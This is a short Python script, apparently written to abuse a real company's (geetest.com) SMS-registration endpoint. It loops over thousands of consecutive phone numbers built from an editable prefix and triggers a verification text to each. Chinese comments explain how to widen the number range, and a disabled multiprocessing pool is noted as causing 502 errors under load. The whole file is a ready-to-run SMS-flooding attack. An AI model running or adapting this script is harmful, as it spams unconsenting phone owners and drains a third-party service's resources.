
"""
    Time: 2019-03-28 08:42

"""

import requests, json
from urllib.parse import unquote
from multiprocessing import Pool

SEND_NUMBER = 10000     # 设定1000则到手机号8位，10000到7位，类推
SEND_PHONE = "1234567000"  # 自行修改前数位


def send_sms(phone):
    send_sms_url = "https://www.geetest.com/api/user/register/send_sms"

    request_headers = {
        'accept-language': 'zh-CN,zh;q=0.9',
        "content-type": "application/json",
    }

    form = {"phone": phone}

    response = requests.post(url=send_sms_url, data=json.dumps(form), headers=request_headers)

    if response.status_code == 200:
        send_result = json.loads(response.text)

        if send_result["status"] == 1:
            print(" * 短信发送至", phone, send_result["error_msg"])
        else:
            print(send_result, phone)


if __name__ == '__main__':

    def send(i):
        if i < 10:
            i = "00" + str(i)
        elif i < 100:
            i = "0" + str(i)

        send_sms(SEND_PHONE[:-3] + str(i))

    # 单线程
    for i in range(SEND_NUMBER):
        send(i)

    # 多线程：太多请求导致接口请求502 BAD REQUEST
    # pool = Pool(processes=48)
    # pool.map(send, {i for i in range(SEND_NUMBER)})